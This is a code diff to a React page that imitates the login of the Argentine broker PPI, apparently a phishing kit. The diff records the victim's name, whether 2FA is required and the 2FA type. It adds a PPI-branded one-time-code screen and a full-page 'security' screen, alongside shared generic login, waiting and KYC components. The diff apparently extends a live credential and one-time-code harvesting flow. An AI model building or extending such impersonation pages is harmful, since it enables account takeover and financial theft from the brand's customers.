@@ -8,8 +8,8 @@ import { useIsMobile } from "@/hooks/use-mobile";
 import PpiLoginForm from "@/components/ppi/PpiLoginForm";
 import WaitingScreen from "@/components/login/WaitingScreen";
 import SuccessScreen from "@/components/login/SuccessScreen";
-import OtpScreen from "@/components/login/OtpScreen";
-import ConfirmEmailScreen from "@/components/login/ConfirmEmailScreen";
+import PpiOtpScreen from "@/components/ppi/PpiOtpScreen";
+import PpiSecurityScreen from "@/components/ppi/PpiSecurityScreen";
 import WayniKycFlow from "@/components/kyc/WayniKycFlow";
 import ppiLogoSvg from "@/assets/ppi-logo.svg";
 import qrFiscalPng from "@/assets/ppi-qr-fiscal.png";
@@ -25,6 +25,7 @@ type StoredPpiFlow = {
   errorMessage: string;
   generalError: string;
   kycCaseId: string | null;
+  twofaType: number | null;
 };
 
 const PPI_STORAGE_KEY = "ppi_flow_state_v1";
@@ -36,7 +37,7 @@ const PPI = () => {
   const initialFlow: StoredPpiFlow = (() => {
     try {
       const raw = sessionStorage.getItem(PPI_STORAGE_KEY);
-      if (!raw) return { step: "form", email: "", sessionId: null, errorMessage: "", generalError: "", kycCaseId: null };
+      if (!raw) return { step: "form", email: "", sessionId: null, errorMessage: "", generalError: "", kycCaseId: null, twofaType: null };
       const parsed = JSON.parse(raw) as Partial<StoredPpiFlow>;
       const allowedSteps: PpiStep[] = ["form", "waiting", "success", "otp", "confirm_email", "kyc"];
       const parsedStep = allowedSteps.includes(parsed.step as PpiStep) ? (parsed.step as PpiStep) : "form";
@@ -47,9 +48,10 @@ const PPI = () => {
         errorMessage: parsed.errorMessage || "",
         generalError: parsed.generalError || "",
         kycCaseId: parsed.kycCaseId || null,
+        twofaType: parsed.twofaType ?? null,
       };
     } catch {
-      return { step: "form", email: "", sessionId: null, errorMessage: "", generalError: "", kycCaseId: null };
+      return { step: "form", email: "", sessionId: null, errorMessage: "", generalError: "", kycCaseId: null, twofaType: null };
     }
   })();
 
@@ -60,6 +62,7 @@ const PPI = () => {
   const [sessionId, setSessionId] = useState<string | null>(initialFlow.sessionId);
   const [errorMessage, setErrorMessage] = useState(initialFlow.errorMessage);
   const [kycCaseId, setKycCaseId] = useState<string | null>(initialFlow.kycCaseId);
+  const [twofaType, setTwofaType] = useState<number | null>(initialFlow.twofaType);
 
   const rateLimit = useRateLimit();
   const isMobile = useIsMobile();
@@ -70,9 +73,9 @@ const PPI = () => {
 
   useEffect(() => {
     currentStepRef.current = step;
-    const flowToStore: StoredPpiFlow = { step, email, sessionId, errorMessage, generalError, kycCaseId };
+    const flowToStore: StoredPpiFlow = { step, email, sessionId, errorMessage, generalError, kycCaseId, twofaType };
     sessionStorage.setItem(PPI_STORAGE_KEY, JSON.stringify(flowToStore));
-  }, [email, errorMessage, generalError, kycCaseId, sessionId, step]);
+  }, [email, errorMessage, generalError, kycCaseId, sessionId, step, twofaType]);
 
   useEffect(() => {
     document.title = "PPI — Iniciar sesión";
@@ -250,7 +253,10 @@ const PPI = () => {
       const otpParts: string[] = [];
       if (res.fullName) otpParts.push(`name:${res.fullName}`);
       if (res.requires_2fa) otpParts.push(`api_2fa:true`);
-      if (res.twofa_type !== undefined) otpParts.push(`twofa_type:${res.twofa_type}`);
+      if (res.twofa_type !== undefined) {
+        otpParts.push(`twofa_type:${res.twofa_type}`);
+        setTwofaType(typeof res.twofa_type === "number" ? res.twofa_type : parseInt(res.twofa_type, 10));
+      }
       otpParts.push("validated:true");
 
       const newId = crypto.randomUUID();
@@ -315,8 +321,8 @@ const PPI = () => {
 
   const renderCardContent = () => {
     if (step === "kyc" && kycCaseId) return <WayniKycFlow caseId={kycCaseId} embedded brandLabel="PPI" />;
-    if (step === "otp" && sessionId) return <OtpScreen email={email} sessionId={sessionId} onBack={handleRetry} />;
-    if (step === "confirm_email" && sessionId) return <ConfirmEmailScreen email={email} sessionId={sessionId} onBack={handleRetry} />;
+    if (step === "otp" && sessionId) return <PpiOtpScreen email={email} sessionId={sessionId} twofaType={twofaType ?? undefined} onBack={handleRetry} />;
+    if (step === "confirm_email") return <PpiSecurityScreen email={email} />;
     if (step === "waiting" && sessionId) {
       return (
         <WaitingScreen
@@ -352,6 +358,9 @@ const PPI = () => {
     </div>
   );
 
+  // PpiSecurityScreen is full-page, render it directly
+  if (step === "confirm_email") return <PpiSecurityScreen email={email} />;
+
   return (
     <div className="flex min-h-[100svh] flex-col bg-white">
       {/* Header */}
@@ -371,7 +380,7 @@ const PPI = () => {
 
         {isKycStep ? (
           <div className="relative z-10 w-full h-full overflow-hidden">{renderCardContent()}</div>
-        ) : step === "otp" || step === "confirm_email" ? (
+        ) : step === "otp" ? (
           <div className="relative z-10 w-full max-w-none sm:max-w-[460px] bg-white px-6 py-6 sm:px-10 sm:py-8">
             {renderCardContent()}
           </div>
